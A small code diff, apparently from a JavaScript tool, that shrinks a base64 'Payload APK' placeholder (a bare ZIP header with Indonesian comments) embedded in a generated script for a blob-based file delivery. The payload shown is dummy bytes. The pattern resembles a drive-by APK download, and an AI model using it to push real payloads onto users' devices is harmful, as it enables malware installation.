@@ -83,12 +83,8 @@ const prepareMimeBlobAsync = (i) => {
             "    return bytes;" +
             "}" +
             
-            // Payload APK (Header ZIP: PK\x03\x04 + dummy bytes diencode Base64)
-            "var b64Data = \"UEsDBAoAAAAAAAMAAAAEAAAAAAAAAAAAAAAQAAAA\" + " +
-            "\"REVBUk1BTklGRVNUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-            "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
+            // Payload APK SANGAT RINGAN (Hanya Header ZIP PK\x03\x04 minimalis)
+            "var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
             
             "var sudah = false;" +
             
